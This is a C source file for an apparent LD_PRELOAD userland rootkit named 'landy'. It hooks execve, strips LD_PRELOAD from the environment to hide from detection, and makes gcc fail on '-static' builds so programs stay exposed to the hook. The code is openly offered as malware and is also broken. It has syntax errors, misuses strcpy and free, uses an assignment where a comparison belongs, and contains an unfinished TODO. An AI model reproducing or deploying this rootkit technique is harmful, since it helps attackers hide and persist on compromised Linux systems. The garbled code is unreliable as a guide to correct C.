#define _GNU_SOURCE
/*
*@@@ landy @@@
*Hooks execve and breaks static compiling. So far has basic features
*that will hide from detection methods
*
*
*/
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>

//grabs the env variables at linking time(?)
extern char **environ;

//sets the old execve
int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);
char *mypreload;

//used to remove LD_PRELOAD when the library is loaded. We will load it back in 
//at the end.
void init(){
	char ldvar[] = "LD_PRELOAD";

	int ldlength = strlen(getenv(ldvar);
	mypreload = malloc(ldlength + 1);
	
	//remove LD_PRELOAD from the enviorment variables
	for(int i = 0; environ[i] != NULL; i++){
		if(strstr(environ[i],ldvar)){
			strcpy(environ[i],mypreload);

			//this may not work *sigh* 
			strcpy(environ[i], '\0');
			free(environ[i]);
		}
	}
	
}

int execve(const char *filename, char *const argv[], char *const envp[]){

	char deflt[] = "LD_PRELOAD=";
	char **newenvp;
	int ldpos = 0;	

	if(!old_execve){
		old_execve = dlsym(RTLD_NEXT,"execve");		
	}
	
	//breaks static compiling
	if(strstr(filename, "gcc")){
		for(int i =0; argv[i] != NULL; i++){
			if(strstr(argv[i],"-static")){
				errno = ETXBSY;
				return -1;
			}
		}
	}

	//need to grab the size of the env vars
	for(int x = 0; envp[x] != NULL; x++){
		if(strstr(envp[x], deflt)){
			ldpos = x;
		}
	}

	//lets load LD_PRELOAD back in :)
	newenvp = (char**)malloc((x+1)*sizeof(char*));

	for(int y = 0;y < x; y++){
		//load back LD_PRELOAD into the right spot
		if(ldpos = 0){
			//TODO		
		}
	}

	return old_execve(filename, argv, newenvp);
}
